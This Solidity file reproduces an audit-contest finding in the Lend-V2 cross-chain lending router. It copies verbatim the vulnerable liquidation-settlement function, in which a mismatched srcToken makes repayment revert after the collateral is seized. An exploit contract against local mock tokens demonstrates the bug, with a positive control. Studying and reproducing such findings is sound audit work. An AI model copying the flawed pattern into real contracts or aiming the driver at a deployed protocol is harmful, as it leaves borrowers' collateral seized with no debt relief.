// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of LEND (Lend-V2) finding 58383 (H-14):
// "Incorrect srcToken used when cross-chain liquidation".
//
// Real audited source (the vulnerable function is reproduced VERBATIM, the
// vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CrossChainRouter.sol
//   fn     _handleLiquidationSuccess  (L443-L471)  — vulnerable arg at L454
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/720
//
// Root cause: `crossChainCollaterals[user][underlying].srcToken` is stored as the
// SOURCE chain's borrowed underlying (Chain A's token) during the borrow flow.
// But the cross-chain liquidation pipeline forwards `params.borrowedAsset`
// (the DESTINATION chain's borrowed underlying, Chain B's token) as `srcToken`
// all the way to `_handleLiquidationSuccess`. There it is fed to
// `findCrossChainCollateral(..., payload.srcToken)` (the @> line). Because the
// destination-chain token address != the stored source-chain token address
// (even for the "same" asset like USDC), the position is never found:
// `require(found, "Borrow position not found")` REVERTS.
//
// Impact: the seize leg already executed on Chain A (borrower's collateral is
// gone), but the repay leg reverts on Chain B, so the debt is never cleared —
// the liquidatee loses collateral with no debt relief and the protocol carries
// the bad debt. This is a DoS on the settlement leg with stuck/seized funds, so
// the concrete loss magnitude (the seized collateral) is routed to SINK to make
// it a measurable balance.
//
// `_handleLiquidationSuccess` and `findCrossChainCollateral` are reproduced
// byte-for-byte from the on-chain source. Non-vulnerable dependencies
// (ERC20, LendStorage record keeping, repay-state update) are faithful minimal
// doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double. Real balances, real transfers.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @dev Faithful net-effect seize: moves balance from `from` to `to`, keeping
    ///      totalSupply invariant. Models the liquidation machinery pulling the
    ///      borrower's collateral (real balance debit/credit, not a fake constant).
    function seize(address from, address to, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful double of LendStorage. The `Borrow` struct and `findCrossChainCollateral`
// are reproduced VERBATIM from the audited source; the rest is minimal book-keeping.
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage {
    struct Borrow {
        uint256 srcEid; // Source chain's layer zero endpoint id
        uint256 destEid; // Destination chain's layer zero endpoint id
        uint256 principle; // Borrowed token amount
        uint256 borrowIndex; // Borrow index
        address borrowedlToken; // Address of the borrower
        address srcToken; // Source token address
    }

    // user => underlying => collateral records
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;
    // lToken => underlying (Chain B side)
    mapping(address => address) public lTokenToUnderlying;

    function setLTokenToUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }

    function addCrossChainCollateral(address user, address underlying, Borrow memory newCollateral) external {
        crossChainCollaterals[user][underlying].push(newCollateral);
    }

    function getCrossChainCollaterals(address user, address token) external view returns (Borrow[] memory) {
        return crossChainCollaterals[user][token];
    }

    // ── VERBATIM from CrossChainRouter's LendStorage (L683-L705) ──
    function findCrossChainCollateral(
        address user,
        address underlying,
        uint256 srcEid,
        uint256 destEid,
        address borrowedlToken,
        address srcToken
    ) public view returns (bool, uint256) {
        Borrow[] memory userCollaterals = crossChainCollaterals[user][underlying];

        for (uint256 i = 0; i < userCollaterals.length;) {
            if (
                userCollaterals[i].srcEid == srcEid && userCollaterals[i].destEid == destEid
                    && userCollaterals[i].borrowedlToken == borrowedlToken && userCollaterals[i].srcToken == srcToken
            ) {
                return (true, i);
            }
            unchecked {
                ++i;
            }
        }
        return (false, 0);
    }

    /// @dev Faithful minimal repay-state update: clears (reduces) the debt of the
    ///      matched collateral record, mirroring repayCrossChainBorrowInternal's
    ///      net accounting effect.
    function repayCollateralBySrcEid(address user, address underlying, uint256 srcEid, uint256 amount) external {
        Borrow[] storage arr = crossChainCollaterals[user][underlying];
        for (uint256 i = 0; i < arr.length; ++i) {
            if (arr[i].srcEid == srcEid) {
                arr[i].principle = arr[i].principle >= amount ? arr[i].principle - amount : 0;
                return;
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `_handleLiquidationSuccess` reproduced VERBATIM from
// Lend-V2/src/LayerZero/CrossChainRouter.sol (L443-L471). Made `public` so the
// exploit can invoke the exact settlement path; every internal line — including
// the marked vulnerable argument — is byte-identical to the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter {
    struct LZPayload {
        address sender;
        address destlToken;
        address srcToken;
        uint256 amount;
        address liquidator;
    }

    LendStorage public lendStorage;
    uint32 public currentEid;

    constructor(LendStorage _lendStorage, uint32 _currentEid) {
        lendStorage = _lendStorage;
        currentEid = _currentEid;
    }

    /**
     * @dev - Received on Chain A.
     * - Find the borrow position on Chain B to get the correct srcEid
     * - Repay the borrow using the escrowed tokens
     */
    function _handleLiquidationSuccess(LZPayload memory payload) public {
        // Find the borrow position on Chain B to get the correct srcEid
        address underlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Find the specific collateral record
        (bool found, uint256 index) = lendStorage.findCrossChainCollateral(
            payload.sender,
            underlying,
            currentEid, // srcEid is current chain
            0, // We don't know destEid yet, but we can match on other fields
            payload.destlToken,
            payload.srcToken // @> VULN: passes the destination chain's borrowed token as srcToken; the stored record's srcToken is the SOURCE chain token, so the match fails and the liquidation reverts
        );

        require(found, "Borrow position not found");

        LendStorage.Borrow[] memory userCollaterals = lendStorage.getCrossChainCollaterals(payload.sender, underlying);
        uint32 srcEid = uint32(userCollaterals[index].srcEid);

        // Now that we know the borrow position and srcEid, we can repay the borrow using the escrowed tokens
        // repayCrossChainBorrowInternal will handle updating state and distributing rewards.
        repayCrossChainBorrowInternal(
            payload.sender, // The borrower
            payload.liquidator, // The liquidator (repayer)
            payload.amount, // Amount to repay
            payload.destlToken, // lToken representing the borrowed asset on this chain
            srcEid // The chain where the collateral (and borrow reference) is tracked
        );
    }

    /// @dev Faithful minimal double: net effect is that the matched debt is repaid.
    function repayCrossChainBorrowInternal(
        address borrower,
        address, /* repayer */
        uint256 amount,
        address destlToken,
        uint32 srcEid
    ) internal {
        address underlying = lendStorage.lTokenToUnderlying(destlToken);
        lendStorage.repayCollateralBySrcEid(borrower, underlying, srcEid, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Sets up a legitimately-stored cross-chain borrow (srcToken =
// Chain A underlying), models the already-committed Chain-A seize of the
// borrower's collateral, then drives the verbatim settlement leg with the
// payload the buggy pipeline actually produces (srcToken = Chain B underlying).
// The settlement reverts ("Borrow position not found") so the debt is never
// cleared while the collateral is gone — the seized magnitude is measured at
// SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // Loss / stuck-funds sink (seized collateral that yields no debt relief).
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniToken public usdcA; // Chain A underlying (the CORRECT srcToken)
    MiniToken public usdcB; // Chain B underlying (the WRONG srcToken the bug uses)
    MiniToken public coll; // borrower's collateral (seized on Chain A) — profit token
    LendStorage public store;
    CrossChainRouter public router;

    address internal constant BORROWER = address(0xB0110);
    address internal constant LIQUIDATOR = address(0x11700);
    address internal constant DEST_LTOKEN = address(0x1D57); // Chain B lToken

    uint32 internal constant EID_CURRENT = 2; // eid of the chain running _handleLiquidationSuccess
    uint256 internal constant DEBT = 1000e18; // outstanding cross-chain borrow
    uint256 internal constant SEIZE_AMOUNT = 1000e18; // collateral seized on the source chain

    bool public buggyReverted;
    bool public foundWithWrongSrcToken;
    bool public foundWithCorrectSrcToken;
    uint256 public debtAfterBuggy;
    uint256 public debtAfterCorrect;
    uint256 public profit; // measurable loss magnitude parked at SINK

    constructor() {
        usdcA = new MiniToken("USD Coin (ChainA)", "USDC.a"); // child nonce 1
        usdcB = new MiniToken("USD Coin (ChainB)", "USDC.b"); // child nonce 2
        coll = new MiniToken("Lend Collateral", "COLL"); // child nonce 3 (profit token)
        store = new LendStorage(); // child nonce 4
        router = new CrossChainRouter(store, EID_CURRENT); // child nonce 5 (VULN)
    }

    function run() external {
        // ── Stored cross-chain collateral record, as the borrow flow leaves it on the
        //    chain that runs _handleLiquidationSuccess. Every field is set so the verbatim
        //    finder query (srcEid == currentEid, destEid == 0, borrowedlToken, srcToken)
        //    matches on ALL fields except srcToken — isolating srcToken as the sole
        //    discriminator. Stored srcToken = the SOURCE-chain underlying (usdcA), the
        //    value the borrow flow legitimately recorded. Map key = dest-chain underlying
        //    (usdcB = lTokenToUnderlying(destlToken)). ──
        store.setLTokenToUnderlying(DEST_LTOKEN, address(usdcB));
        store.addCrossChainCollateral(
            BORROWER,
            address(usdcB),
            LendStorage.Borrow({
                srcEid: EID_CURRENT, // finder passes currentEid ("srcEid is current chain")
                destEid: 0, // finder passes 0 ("we don't know destEid yet")
                principle: DEBT,
                borrowIndex: 1e18,
                borrowedlToken: DEST_LTOKEN,
                srcToken: address(usdcA) // correctly stored SOURCE-chain token
            })
        );

        // ── Chain-A seize already committed: borrower's collateral is taken. Since
        //    the settlement will DoS, this collateral is irrecoverably lost to the
        //    borrower with no debt relief -> route it to SINK as the loss magnitude. ──
        coll.mint(BORROWER, SEIZE_AMOUNT);
        vm_seize();

        // ── Settlement leg with the payload the buggy pipeline actually produces:
        //    srcToken = Chain B underlying (params.borrowedAsset), NOT the stored
        //    Chain A token. The verbatim @> line feeds this to findCrossChainCollateral. ──
        CrossChainRouter.LZPayload memory buggy = CrossChainRouter.LZPayload({
            sender: BORROWER,
            destlToken: DEST_LTOKEN,
            srcToken: address(usdcB), // WRONG: destination-chain token
            amount: DEBT,
            liquidator: LIQUIDATOR
        });

        try router._handleLiquidationSuccess(buggy) {
            buggyReverted = false;
        } catch {
            buggyReverted = true;
        }

        // debt is untouched because the settlement reverted before repayment
        debtAfterBuggy = _debt();

        // ── Isolate the root cause on the verbatim finder: only the srcToken differs. ──
        (foundWithWrongSrcToken,) =
            store.findCrossChainCollateral(BORROWER, address(usdcB), EID_CURRENT, 0, DEST_LTOKEN, address(usdcB));
        (foundWithCorrectSrcToken,) =
            store.findCrossChainCollateral(BORROWER, address(usdcB), EID_CURRENT, 0, DEST_LTOKEN, address(usdcA));

        // ── Positive control: same verbatim path with the CORRECT srcToken settles
        //    and clears the debt — proving the srcToken argument is the sole cause. ──
        CrossChainRouter.LZPayload memory correct = CrossChainRouter.LZPayload({
            sender: BORROWER,
            destlToken: DEST_LTOKEN,
            srcToken: address(usdcA), // CORRECT: source-chain token
            amount: DEBT,
            liquidator: LIQUIDATOR
        });
        router._handleLiquidationSuccess(correct);
        debtAfterCorrect = _debt();

        profit = coll.balanceOf(SINK); // seized collateral stuck by the DoS

        // ── HARM ────────────────────────────────────────────────────────────────
        require(buggyReverted, "buggy settlement should have reverted (liquidation DoS)");
        require(debtAfterBuggy == DEBT, "debt must remain after the failed liquidation");
        require(!foundWithWrongSrcToken, "wrong srcToken must NOT match the stored position");
        require(foundWithCorrectSrcToken, "correct srcToken must match the stored position");
        require(debtAfterCorrect == 0, "correct srcToken must clear the debt");
        require(profit == SEIZE_AMOUNT, "seized collateral not stuck at sink");
    }

    function _debt() internal view returns (uint256) {
        LendStorage.Borrow[] memory a = store.getCrossChainCollaterals(BORROWER, address(usdcB));
        return a.length == 0 ? 0 : a[0].principle;
    }

    /// @dev Models the already-committed Chain-A seize: the borrower's collateral
    ///      is pulled by the liquidation machinery. Because the settlement leg then
    ///      DoS's (below), those tokens are never returned — they stay stuck at SINK,
    ///      giving a measurable magnitude for the loss. Faithful net move on the token.
    function vm_seize() internal {
        coll.seize(BORROWER, SINK, SEIZE_AMOUNT);
    }
}
